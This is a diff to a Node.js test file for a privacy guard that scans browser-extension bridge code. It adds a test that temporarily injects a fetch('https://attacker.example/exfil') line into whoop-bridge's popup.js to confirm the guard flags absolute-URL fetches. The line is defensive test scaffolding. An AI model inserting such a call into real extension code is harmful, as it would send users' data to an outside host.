@@ -1,7 +1,7 @@
 import { describe, it } from "node:test";
 import assert from "node:assert/strict";
 import { execFileSync, spawnSync } from "node:child_process";
-import { copyFileSync, readFileSync, writeFileSync } from "node:fs";
+import { copyFileSync, existsSync, readFileSync, writeFileSync } from "node:fs";
 import { dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
 
@@ -10,6 +10,7 @@ const REPO = dirname(HERE);
 const SCRIPT = join(HERE, "check-bridge-privacy-surface.mjs");
 const GOLDEN = join(HERE, "fixtures/bridge-privacy-surface.json");
 const POPUP = join(REPO, "packages/garmin-bridge/popup.js");
+const WHOOP_POPUP = join(REPO, "packages/whoop-bridge/popup.js");
 
 const runGuard = () =>
   spawnSync("node", [SCRIPT], {
@@ -59,6 +60,21 @@ describe("bridge privacy surface guard", () => {
     }
   });
 
+  it("covers whoop-bridge popup.js despite its missing manifest.prod.json", () => {
+    const original = readFileSync(WHOOP_POPUP, "utf8");
+    const tampered = `${original}\n// fixture line\nfetch("https://attacker.example/exfil");\n`;
+    writeFileSync(WHOOP_POPUP, tampered);
+
+    try {
+      const result = runGuard();
+      assert.equal(result.status, 1);
+      assert.match(result.stderr, /absolute-URL fetch/);
+      assert.match(result.stderr, /whoop-bridge/);
+    } finally {
+      writeFileSync(WHOOP_POPUP, original);
+    }
+  });
+
   it("verifies the script is executable directly", () => {
     // Smoke test that the import side-effect isn't broken.
     assert.doesNotThrow(() => execFileSync("node", [SCRIPT], { cwd: REPO }));
@@ -71,10 +87,14 @@ describe("bridge privacy surface guard", () => {
     // train2go-zones-sync change.
     const golden = JSON.parse(readFileSync(GOLDEN, "utf8"));
     for (const bridge of Object.keys(golden)) {
-      const contentSrc = readFileSync(
-        join(REPO, "packages", bridge, "content.js"),
-        "utf8"
-      );
+      const contentPath = join(REPO, "packages", bridge, "content.js");
+      if (!existsSync(contentPath)) {
+        // Bridges without a site content script (whoop) declare an empty
+        // allowlist in the golden; nothing to cross-count.
+        assert.deepEqual(golden[bridge].allowed_paths, []);
+        continue;
+      }
+      const contentSrc = readFileSync(contentPath, "utf8");
       const start = contentSrc.indexOf("const ALLOWED");
       assert.ok(start >= 0, `${bridge}: content.js has no ALLOWED const`);
       const end = contentSrc.indexOf("];", start);
